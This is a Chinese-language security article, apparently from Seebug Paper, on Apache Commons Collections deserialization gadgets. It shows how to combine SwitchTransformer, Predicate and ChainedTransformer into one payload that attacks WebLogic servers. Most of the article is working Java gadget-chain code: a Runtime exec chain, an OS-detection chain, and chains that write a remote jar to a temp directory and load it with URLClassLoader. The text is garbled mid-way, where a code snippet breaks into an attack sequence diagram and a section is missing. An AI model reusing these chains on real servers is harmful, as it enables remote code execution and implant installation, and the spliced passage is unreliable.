**作者：宽字节安全  
公众号：**
**本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：PI:EMAIL**
### 0x01 简介
众所周知，CommonCollection
Gadget主要是由`ConstantTransformer`，`InvokerTransformer`，`ChainedTransformer`构成。gadget主要通过`Transformer`接口
的`transform`方法，对输入的对象做变换。`ConstantTransformer`不会做任何变换，只会返回类在实例化时传入的对象，`InvokerTransformer`会对类在实例化时传入的参数，通过反射去调用，`ChainedTransformer`将所有的`Transformer`连接起来，上一个`Transformer`的`transform`方法的结果，作为下一个`Transformer`的`transform`方法的参数。这样就完成java反序列化的gadget。下面为调用Runtime执行calc的CommonCollection的chain
            final Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                    new InvokerTransformer("exec",
                        new Class[] { String.class }, execArgs),
                    new ConstantTransformer(1) };
上面的chain等效与下面的代码
    Runtime.class.getMethod("getRuntime", new Class[0]).invoke(null, new Object
从上面的代码中我们可以暂时得出以下结论
  1. 只有链式调用的方法才可以被改写成CommonCollection执行链
  2. gadget中，不能有变量声明语句
  3. 没有while等语句
  4. 一切操作靠反射
### 0x02 CommonCollection其他Transform的简介
在`org.apache.commons.collections.functors`中，所有的类都可以被简单的分为三类，分别继承自`Transformer`接口，
`Predicate`接口，`Closure`接口。这三个接口主要有以下区别
  1. `Transformer`接口接收一个对象，返回对象的执行结果
  2. `Closure`接口接收一个对象，不返回对象的执行结果
  3. `Predicate`接口，类似条件语句，会根据执行结果，返回true或者false。这个将主要用在SwitchTransformer类中
对于我们来说，`Closure`接口没有太多用，下面主要介绍一下继承自`Transformer`接口的类与继承自`Predicate`接口的类
#### 继承自`Transformer`接口的类
##### ChainedTransformer
将实例化后的Transformer的类的数组，按顺序一个一个执行，前面的transform结果作为下一个transform的输出。
        public Object transform(Object object) {
            for (int i = 0; i >weblogic: 上传至Linux的临时目录/tmp/xxx.jar
    攻击者->>weblogic: 调用urlclassloader加载，安装实例
    攻击者->>weblogic:通过lookup查找实例，检测是否安装成功
    weblogic->>攻击者: 安装成功，结束
    weblogic->>攻击者: 安装失败，抛出异常
    攻击者->>weblogic: 上传至windows的临时目录 C:\\Windows\\Temp\\xxx.jar
    攻击者->>weblogic: 调用urlclassloader加载，安装实例
    攻击者->>weblogic:通过lookup查找实例，检测是否安装成功
    weblogic->>攻击者: 安装成功 结束
    weblogic->>攻击者: 安装失败
攻击一次weblogic服务器，最多可能需要发送6次反序列化包，才能成功的给weblogic服务器安装实例。这显然不符合我们精简代码的思想。下面我们用正常思维的方式去执行一下攻击过程
    if (os == 'win'){
        fileOutput(winTemp)
        }
    else{
        fileOutput(LinuxTemp)
        }
    if (os == 'win'){
        urlclassloader.load(winTemp)
        }
    else{
        urlclassloader.load(LinuxTemp)
        }
这里我们可以使用`SwitchTransformer` \+ `Predicate` \+ `ChainedTransformer` 组合去完成。
  1. `SwitchTransformer`类似于if语句
  2. `Predicate`类似于条件语句
  3. `ChainedTransformer` 将所有的语句串起来执行
`SwitchTransformer`类需要一个`Predicate`，而这里`TransformerPredicate`可以将一个Transformer转换为一个`Predicate`。所以我们需要一个可以判断操作系统的chain。然后将判断操作系统的chain作为`Predicate`，调用switchTransformer，根据结果，将可执行ja包写入win或者linux的临时目录。然后再调用第二个switchTransformer，根据操作系统的类型，调用URLclassloader分别加载相应上传位置的jar包，通过chainedTransformer将两个SwitchTransformer将两个SwitchTransform连接起来。代码如下
            Transformer t = TransformerUtils.switchTransformer(
                    PredicateUtils.asPredicate(
                            getSysTypeTransformer()
                    ),
                    new ChainedTransformer(new Transformer[]{
                            new ConstantTransformer(FileOutputStream.class),
                            new InstantiateTransformer(
                                    new Class[]{
                                            String.class, Boolean.TYPE
                                    },
                                    new Object[]{
                                            "C:\\Windows\\Temp\\xxx.jar", false
                                    }),
                            new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{getRemoteJarBytes()})
                    }),
                    TransformerUtils.nopTransformer());
            Transformer t1 = TransformerUtils.switchTransformer(
                    PredicateUtils.asPredicate(
                            getSysTypeTransformer()
                    ),
                    new ChainedTransformer(new Transformer[]{
                            new ConstantTransformer(URLClassLoader.class),
                            new InstantiateTransformer(
                                    new Class[]{
                                            URL[].class
                                    },
                                    new Object[]{
                                            new URL[]{new URL("file:/C:\\Windows\\Temp\\xxx.jar")}
                                    }),
                            new InvokerTransformer("loadClass",
                                    new Class[]{String.class}, new Object[]{className}),
                            new InvokerTransformer("getMethod",
                                    new Class[]{String.class, Class[].class}, new Object[]{"test", new Class[]{String.class}}),
                            new InvokerTransformer("invoke",
                                    new Class[]{Object.class, Object[].class}, new Object[]{null, new String[]{op}})}),
                    TransformerUtils.nopTransformer()); // 这块自行改成linux的吧
            Transformer list = new ChainedTransformer(new Transformer[]{
                    t,
                    t1
            });
        private static ChainedTransformer getSysTypeTransformer() {
            return new ChainedTransformer(new Transformer[]{
                    new ConstantTransformer(System.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getProperty", new Class[]{String.class}}),
                    new InvokerTransformer("invoke",
                            new Class[]{Object.class, Object[].class},
                            new Object[]{null, new Object[]{"os.name"}}),
                    new InvokerTransformer("toString",
                            new Class[]{},
                            new Object[0]),
                    new InvokerTransformer("toLowerCase",
                            new Class[]{},
                            new Object[0]),
                    new InvokerTransformer("contains",
                            new Class[]{CharSequence.class},
                            new Object[]{"win"}),
            });
        }
### 0x04 参考
  1. 
  2. 
* * *